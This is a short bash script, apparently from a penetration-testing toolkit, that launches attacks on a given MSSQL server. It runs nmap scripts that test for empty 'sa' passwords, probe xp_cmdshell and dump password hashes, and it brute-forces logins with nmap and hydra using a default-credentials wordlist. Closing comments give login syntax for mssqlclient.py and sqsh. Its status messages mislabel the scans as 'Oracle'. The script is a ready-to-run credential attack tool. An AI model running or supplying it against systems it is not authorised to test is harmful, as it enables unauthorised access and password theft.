#!/bin/bash

# https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
host=$1
port=1433
mkdir -p "test_results/mssql/${host}"
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
mssql_creds="wordlists/mssql_default_creds.txt"
if [[ ! -z "${2}" ]]; then
	port=$2
fi

echo "Launching Oracle scans on ${host}:${port}"
# must download
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p "${port}" "${host}" -oA "test_results/mssql/${host}/general_p${port}" &
nmap -p "${port}" --script ms-sql-brute -oA "test_results/mssql/${host}/nmap_brute_p${port}" "${host}" &
hydra -C "${mssql_creds}" "${host}" mssql -s "${port}" -o "test_results/mssql/${host}/hydra_brute_p${port}" &
echo "Oracle scans on ${host}:${port} launched."
exit 0

# windows auth: mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
# mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP
# windows auth: sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
# sqsh -S <IP> -U <Username> -P <Password> -D <Database>